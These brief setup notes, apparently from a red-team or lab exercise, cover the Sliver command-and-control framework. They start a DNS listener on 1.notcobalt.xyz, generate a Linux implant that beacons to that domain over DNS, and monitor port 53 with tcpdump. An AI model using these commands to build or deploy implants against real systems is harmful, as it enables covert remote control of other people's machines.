1- lo del dns
2- tmux 
3- /opt/sliver-server

sliver > dns --domains 1.notcobalt.xyz.
sliver > generate --os linux --dns 1.notcobalt.xyz --skip-symbols
root@sliver-sh-0:/home/sliver# tcpdump  -nn port 53

